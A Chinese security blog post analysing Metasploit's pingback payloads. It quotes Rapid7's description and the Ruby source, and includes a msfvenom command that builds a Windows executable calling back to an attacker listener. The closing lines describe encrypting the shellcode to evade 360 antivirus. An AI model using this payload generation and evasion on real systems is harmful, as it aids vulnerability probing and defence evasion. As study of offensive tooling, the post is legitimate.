@@ -1,0 +1,86 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="cfb252e153b65acdaaebba8611adf66c">MSF Pingback Payloads</h1>
+<h2 data-content="1" id="6630ede4dc4fcf5cbc13cb1fd13b0933">0x00 前言</h2>
+<p>今天早上Rapid7cn的公众号更新了一篇文章，然后就被群里的大师傅们转发了好几遍233，感觉挺有意思的，也想着分析一下</p>
+<p><a href="https://mp.weixin.qq.com/s/ZI-qQ_ORKG_gJ2Wnc2PiRA" target="_blank">https://mp.weixin.qq.com/s/ZI-qQ_ORKG_gJ2Wnc2PiRA</a></p>
+<p>官网： <a href="https://blog.rapid7.com/2019/08/01/introducing-pingback-payloads/" target="_blank">https://blog.rapid7.com/2019/08/01/introducing-pingback-payloads/</a></p>
+<h2 data-content="1" id="899feecc5ae94e371e2e0434d6a70191">0x01 pingback</h2>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190906005646-255a57ba-cffe-1.png"/>这次一共更新了10个pingback payload, 至于什么是pingback，其实msf官方在github已经说的很清楚了<a href="https://github.com/rapid7/metasploit-framework/pull/12129" target="_blank">https://github.com/rapid7/metasploit-framework/pull/12129</a></p>
+<blockquote>
+<p>Pingback payloads are designed to provide a limited-functionality payload to verify an exploit has worked. <strong>It does not provide a shell of any kind.</strong> A pingback payload creates a "random" UUID value (separate from the payload UUID) that is written to the Metasploit database along with other data. When executed on target, the payload sends back that UUID to verify that the exploit worked, but nothing else. When Framework receives that UUID, we verify the target is vulnerable to the exploit without loading an interactive shell.<br/>
+This prevents traditional [W/M]ITM attacks or someone sniffing the traffic for information, as the UUID itself means nothing to a listener, and without further execution, the session itself is not particularly valuable to an attacker.</p>
+</blockquote>
+<p>简单来说感觉其实就是，AV对msf之前的常规reverse_shell会进行拦截，导致我们并不能很清楚的知道目标是否存在该漏洞，然后这个payload就完全不会产生交互式shell，而只是返回一个UUID，能让我们知道poc/exp是否执行成功，然后目标是否存在当前漏洞，而不必担心被中间人攻击或者被拦截</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190906005648-262838ba-cffe-1.png"/></p>
+<h2 data-content="1" id="7c8e9fe5b2885f908a2b546e916d4e82">0x02 How to Use</h2>
+<p>翻看代码，我们发现它其实是每次生成一个新的UUID，然后将其发送到目标中，然后调用listener中的payload设置一个监听，然后当程序进行 <code>Pingback</code> 时，MSF打开一个会话来接受UUID，最后拿到完整UUID后，就关闭当前session</p>
+<div class="highlight"><pre><span></span><span class="c1"># msf/modules/payloads/singles/ruby/pingback_reverse_tcp.rb</span>
+<span class="k">def</span> <span class="nf">ruby_string</span>
+    <span class="nb">self</span><span class="o">.</span><span class="n">pingback_uuid</span> <span class="o">||=</span> <span class="nb">self</span><span class="o">.</span><span class="n">generate_pingback_uuid</span>
+    <span class="n">lhost</span> <span class="o">=</span> <span class="n">datastore</span><span class="o">[</span><span class="s1">'LHOST'</span><span class="o">]</span>
+    <span class="n">lhost</span> <span class="o">=</span> <span class="s2">"[</span><span class="si">#{</span><span class="n">lhost</span><span class="si">}</span><span class="s2">]"</span> <span class="k">if</span> <span class="no">Rex</span><span class="o">::</span><span class="no">Socket</span><span class="o">.</span><span class="n">is_ipv6?</span><span class="p">(</span><span class="n">lhost</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s2">"require'socket';"</span> <span class="p">\</span>
+      <span class="s2">"c=TCPSocket.new'</span><span class="si">#{</span><span class="n">lhost</span><span class="si">}</span><span class="s2">',</span><span class="si">#{</span><span class="n">datastore</span><span class="o">[</span><span class="s1">'LPORT'</span><span class="o">].</span><span class="n">to_i</span><span class="si">}</span><span class="s2">;"</span> <span class="p">\</span>
+      <span class="s2">"c.puts'</span><span class="si">#{</span><span class="o">[[</span><span class="nb">self</span><span class="o">.</span><span class="n">pingback_uuid</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s1">'H*'</span><span class="p">)</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s1">'m0'</span><span class="p">)</span><span class="si">}</span><span class="s2">'.unpack('m0');"</span>
+      <span class="s2">"c.close"</span>
+  <span class="k">end</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="c1"># msf/base/sessions/pingback.rb</span>
+<span class="k">def</span> <span class="nf">uuid_read</span>
+    <span class="n">uuid_raw</span> <span class="o">=</span> <span class="n">rstream</span><span class="o">.</span><span class="n">get_once</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="k">return</span> <span class="kp">nil</span> <span class="k">unless</span> <span class="n">uuid_raw</span>
+    <span class="nb">self</span><span class="o">.</span><span class="n">uuid_string</span> <span class="o">=</span> <span class="n">uuid_raw</span><span class="o">.</span><span class="n">each_byte</span><span class="o">.</span><span class="n">map</span> <span class="p">{</span> <span class="o">|</span><span class="n">b</span><span class="o">|</span> <span class="s2">"%02x"</span> <span class="o">%</span> <span class="n">b</span><span class="o">.</span><span class="n">to_i</span><span class="p">()</span> <span class="p">}</span><span class="o">.</span><span class="n">join</span>
+    <span class="n">print_status</span><span class="p">(</span><span class="s2">"Incoming UUID = </span><span class="si">#{</span><span class="n">uuid_string</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">framework</span><span class="o">.</span><span class="n">db</span><span class="o">.</span><span class="n">active</span>
+      <span class="k">begin</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">framework</span><span class="o">.</span><span class="n">db</span><span class="o">.</span><span class="n">payloads</span><span class="p">(</span><span class="ss">uuid</span><span class="p">:</span> <span class="n">uuid_string</span><span class="p">)</span><span class="o">.</span><span class="n">first</span>
+        <span class="k">if</span> <span class="n">payload</span><span class="o">.</span><span class="n">nil?</span>
+          <span class="n">print_warning</span><span class="p">(</span><span class="s2">"Provided UUID (</span><span class="si">#{</span><span class="n">uuid_string</span><span class="si">}</span><span class="s2">) was not found in database!"</span><span class="p">)</span>
+        <span class="k">else</span>
+          <span class="n">print_good</span><span class="p">(</span><span class="s2">"UUID identified (</span><span class="si">#{</span><span class="n">uuid_string</span><span class="si">}</span><span class="s2">)"</span><span class="p">)</span>
+        <span class="k">end</span>
+      <span class="k">rescue</span> <span class="no">ActiveRecord</span><span class="o">::</span><span class="no">ConnectionNotEstablished</span>
+        <span class="n">print_status</span><span class="p">(</span><span class="s2">"WARNING: UUID verification and logging is not available, because the database is not active."</span><span class="p">)</span>
+      <span class="k">rescue</span> <span class="o">=&gt;</span> <span class="n">e</span>
+        <span class="c1"># TODO: Can we have a more specific exception handler?</span>
+        <span class="c1"># Test: what if we send no bytes back?  What if we send less than 16 bytes?  Or more than?</span>
+        <span class="n">elog</span><span class="p">(</span><span class="s2">"Can't get original UUID"</span><span class="p">)</span>
+        <span class="n">elog</span><span class="p">(</span><span class="s2">"Exception Class: </span><span class="si">#{</span><span class="n">e</span><span class="o">.</span><span class="n">class</span><span class="o">.</span><span class="n">name</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+        <span class="n">elog</span><span class="p">(</span><span class="s2">"Exception Message: </span><span class="si">#{</span><span class="n">e</span><span class="o">.</span><span class="n">message</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+        <span class="n">elog</span><span class="p">(</span><span class="s2">"Exception Backtrace: </span><span class="si">#{</span><span class="n">e</span><span class="o">.</span><span class="n">backtrace</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+      <span class="k">end</span>
+    <span class="k">else</span>
+      <span class="n">print_warning</span><span class="p">(</span><span class="s2">"WARNING: UUID verification and logging is not available, because the database is not active."</span><span class="p">)</span>
+    <span class="k">end</span>
+  <span class="k">end</span>
+</pre></div>
+<p>然后在 <code>option.rb</code> 中，我们能看到pingback的模块存在两个选项：</p>
+<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">info</span> <span class="o">=</span> <span class="p">{})</span>
+    <span class="k">super</span>
+    <span class="n">register_advanced_options</span><span class="p">(</span>
+      <span class="o">[</span>
+        <span class="no">Msf</span><span class="o">::</span><span class="no">OptInt</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">'PingbackRetries'</span><span class="p">,</span> <span class="o">[</span><span class="kp">true</span><span class="p">,</span> <span class="s2">"How many additional successful pingbacks"</span><span class="p">,</span> <span class="mi">0</span><span class="o">]</span><span class="p">),</span>
+        <span class="no">Msf</span><span class="o">::</span><span class="no">OptInt</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">'PingbackSleep'</span><span class="p">,</span> <span class="o">[</span><span class="kp">true</span><span class="p">,</span> <span class="s2">"Time (in seconds) to sleep between pingbacks"</span><span class="p">,</span> <span class="mi">30</span><span class="o">]</span><span class="p">)</span>
+      <span class="o">]</span><span class="p">,</span> <span class="nb">self</span><span class="o">.</span><span class="n">class</span><span class="p">)</span>
+  <span class="k">end</span>
+</pre></div>
+<ul>
+<li>PingbackRetries  - pingback的次数</li>
+<li>PingbackSleep - pinigback的时间间隔</li>
+</ul>
+<p>我们利用 <code>Msfvenom</code> 生成一个 <code>windows/x64/pingback_reverse_tcp</code> 的exe木马</p>
+<div class="highlight"><pre><span></span><span class="n">msfvenom</span> <span class="o">-</span><span class="nb">p</span> <span class="n">windows</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">pingback_reverse_tcp</span> <span class="o">-</span><span class="n">f</span> <span class="n">exe</span> <span class="o">-</span><span class="n">o</span> <span class="n">patrilic</span><span class="o">.</span><span class="n">exe</span> <span class="no">LHOST</span><span class="o">=</span><span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">1</span><span class="o">.</span><span class="mi">107</span> <span class="no">LPORT</span><span class="o">=</span><span class="mi">4445</span> <span class="no">EXITFUNC</span><span class="o">=</span><span class="n">thread</span> <span class="no">PINGBACKRETRIES</span><span class="o">=</span><span class="mi">10</span> <span class="no">PINGBACKSLEEP</span><span class="o">=</span><span class="mi">5</span>
+</pre></div>
+<p>然后在目标机器上执行时：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190906005648-2676372c-cffe-1.png"/>只会返回UUID<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190906005649-26bfe0c0-cffe-1.png"/></p>
+<p>然后目标机器上并没有产生任何的交互式shell，同时使用 <code>Wireshark</code> 也只能捕获到16byte的UUID值</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190906005649-27131b5a-cffe-1.png"/></p>
+<h2 data-content="1" id="2f4a58934e740b30539dc67ec21d42e5">0x03 总结</h2>
+<p>这次更新的pingback payload，已经感觉是最小化的攻击载荷了，而且特征也并不明显，只是一串随机的UUID值而已，感觉用来验证漏洞还是挺不错的，然后后面再办法去掉exp特征，使用另外的方式来获得交互式shell或者直接执行命令云云.. 当然，msf直接生成的程序特征还是挺明显的，还是需要进行免杀，不过由于这个payload并没有进行起敏感进程，所以还是比较好免杀的。</p>
+<p>时间太晚了，shellcode随便加密搞了下，静态还行，其实也就是识别的msf的特征，但是动态估计也没啥2333毕竟也没有危险进程，只是开了个socket<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190906005650-278dd2be-cffe-1.png"/></p>
+<p>然后进程开起来的话，找了个360的机子试了下，没啥问题<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190906005650-27b936ac-cffe-1.png"/></p>
+<p>特征估计也快普及了，然后主要是感觉思路挺好的，学习了～<br/>
+rapid7牛逼</p>
+</div>
+</div>
